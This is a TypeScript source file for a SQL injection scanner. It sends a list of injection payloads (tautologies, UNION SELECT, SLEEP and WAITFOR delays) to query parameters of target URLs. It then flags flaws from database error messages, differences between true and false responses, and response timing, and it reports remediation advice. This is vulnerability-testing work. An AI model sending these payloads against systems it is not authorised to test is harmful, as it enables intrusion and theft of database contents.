/**
 * SQL Injection Scanner
 * Detects SQL Injection vulnerabilities
 */

import type {
  Vulnerability,
  VulnerabilityType,
  SeverityLevel,
  ScanConfig,
  HttpResponse,
} from "./types";

export class SQLInjectionScanner {
  private readonly sqlPayloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL, NULL--",
    "1' AND '1'='2",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '00:00:05'--",
  ];

  private readonly errorPatterns = [
    /SQL syntax.*MySQL/i,
    /Warning.*mysql_/i,
    /valid MySQL result/i,
    /MySqlClient\./i,
    /PostgreSQL.*ERROR/i,
    /Warning.*\Wpg_/i,
    /valid PostgreSQL result/i,
    /Npgsql\./i,
    /Driver.* SQL[\-\_\ ]*Server/i,
    /OLE DB.* SQL Server/i,
    /SQLServer JDBC Driver/i,
    /SqlClient\./i,
    /Oracle error/i,
    /Oracle.*Driver/i,
    /Warning.*oci_/i,
    /Warning.*ora_/i,
  ];

  /**
   * Scan for SQL Injection vulnerabilities
   */
  async scan(
    config: ScanConfig,
    makeRequest: (
      url: string,
      config: ScanConfig,
    ) => Promise<HttpResponse | null>,
  ): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];

    if (!config.targets.urls) return vulnerabilities;

    for (const url of config.targets.urls) {
      // Test each SQL injection payload
      for (const payload of this.sqlPayloads) {
        const testUrls = this.generateTestUrls(url, payload);

        for (const testUrl of testUrls) {
          try {
            const response = await makeRequest(testUrl, config);

            if (response) {
              // Check for SQL errors
              if (this.detectSQLError(response.body)) {
                vulnerabilities.push(
                  this.createVulnerability({
                    url: testUrl,
                    payload,
                    response: response.body.substring(0, 500),
                    errorDetected: true,
                    severity: "critical" as SeverityLevel,
                  }),
                );
                break; // Found vulnerability
              }

              // Check for boolean-based blind SQL injection
              const blindVuln = await this.checkBlindSQLInjection(
                url,
                payload,
                makeRequest,
                config,
              );
              if (blindVuln) {
                vulnerabilities.push(blindVuln);
                break;
              }
            }
          } catch (error) {
            // Continue with next payload
          }
        }
      }

      // Check for time-based blind SQL injection
      const timeVulns = await this.checkTimeBasedSQLInjection(
        url,
        makeRequest,
        config,
      );
      vulnerabilities.push(...timeVulns);
    }

    return vulnerabilities;
  }

  /**
   * Generate test URLs with SQL injection payloads
   */
  private generateTestUrls(baseUrl: string, payload: string): string[] {
    const testUrls: string[] = [];
    const encodedPayload = encodeURIComponent(payload);

    // Test different parameters
    testUrls.push(`${baseUrl}?id=${encodedPayload}`);
    testUrls.push(`${baseUrl}?user=${encodedPayload}`);
    testUrls.push(`${baseUrl}?search=${encodedPayload}`);
    testUrls.push(`${baseUrl}?page=${encodedPayload}`);

    return testUrls;
  }

  /**
   * Detect SQL errors in response
   */
  private detectSQLError(response: string): boolean {
    for (const pattern of this.errorPatterns) {
      if (pattern.test(response)) {
        return true;
      }
    }
    return false;
  }

  /**
   * Check for boolean-based blind SQL injection
   */
  private async checkBlindSQLInjection(
    url: string,
    payload: string,
    makeRequest: (
      url: string,
      config: ScanConfig,
    ) => Promise<HttpResponse | null>,
    config: ScanConfig,
  ): Promise<Vulnerability | null> {
    try {
      // Test true condition
      const truePayload = "1' AND '1'='1";
      const trueUrl = `${url}?id=${encodeURIComponent(truePayload)}`;
      const trueResponse = await makeRequest(trueUrl, config);

      // Test false condition
      const falsePayload = "1' AND '1'='2";
      const falseUrl = `${url}?id=${encodeURIComponent(falsePayload)}`;
      const falseResponse = await makeRequest(falseUrl, config);

      if (trueResponse && falseResponse) {
        // If responses are significantly different, might be blind SQL injection
        const sizeDiff = Math.abs(
          trueResponse.body.length - falseResponse.body.length,
        );
        const statusDiff = trueResponse.status !== falseResponse.status;

        if (sizeDiff > 100 || statusDiff) {
          return this.createVulnerability({
            url,
            payload: "Boolean-based blind SQL injection",
            response: `True response: ${trueResponse.body.length} bytes, False response: ${falseResponse.body.length} bytes`,
            errorDetected: false,
            severity: "high" as SeverityLevel,
          });
        }
      }
    } catch (error) {
      // Ignore errors
    }

    return null;
  }

  /**
   * Check for time-based blind SQL injection
   */
  private async checkTimeBasedSQLInjection(
    url: string,
    makeRequest: (
      url: string,
      config: ScanConfig,
    ) => Promise<HttpResponse | null>,
    config: ScanConfig,
  ): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];

    const timePayloads = [
      "1' AND SLEEP(5)--",
      "1'; WAITFOR DELAY '00:00:05'--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ];

    for (const payload of timePayloads) {
      const testUrl = `${url}?id=${encodeURIComponent(payload)}`;

      try {
        const startTime = Date.now();
        await makeRequest(testUrl, config);
        const duration = Date.now() - startTime;

        // If response takes significantly longer (> 4 seconds for 5 second delay)
        if (duration > 4000) {
          vulnerabilities.push(
            this.createVulnerability({
              url: testUrl,
              payload,
              response: `Response time: ${duration}ms (expected delay: 5000ms)`,
              errorDetected: false,
              severity: "high" as SeverityLevel,
            }),
          );
          break; // Found time-based vulnerability
        }
      } catch (error) {
        // Continue with next payload
      }
    }

    return vulnerabilities;
  }

  /**
   * Create vulnerability object
   */
  private createVulnerability(data: {
    url: string;
    payload: string;
    response: string;
    errorDetected: boolean;
    severity: SeverityLevel;
  }): Vulnerability {
    const description = data.errorDetected
      ? "SQL error messages detected in response, indicating unfiltered user input in database queries"
      : data.payload.includes("SLEEP") || data.payload.includes("WAITFOR")
        ? "Time-based blind SQL injection detected - response time indicates database query manipulation"
        : "Boolean-based blind SQL injection detected - response differences indicate SQL query manipulation";

    return {
      id: `sqli_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      type: "sql_injection" as VulnerabilityType,
      severity: data.severity,
      title: "SQL Injection Vulnerability",
      description,
      location: { url: data.url },
      impact:
        "Attackers can read, modify, or delete database contents. May lead to complete system compromise, data breaches, or data loss",
      recommendation:
        "Use parameterized queries (prepared statements). Implement input validation. Apply principle of least privilege for database accounts. Use ORM frameworks properly",
      references: [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
      ],
      discoveredAt: new Date(),
      status: "new",
      evidence: {
        payload: data.payload,
        response: data.response,
      },
      metadata: {
        errorBased: data.errorDetected,
      },
    };
  }
}
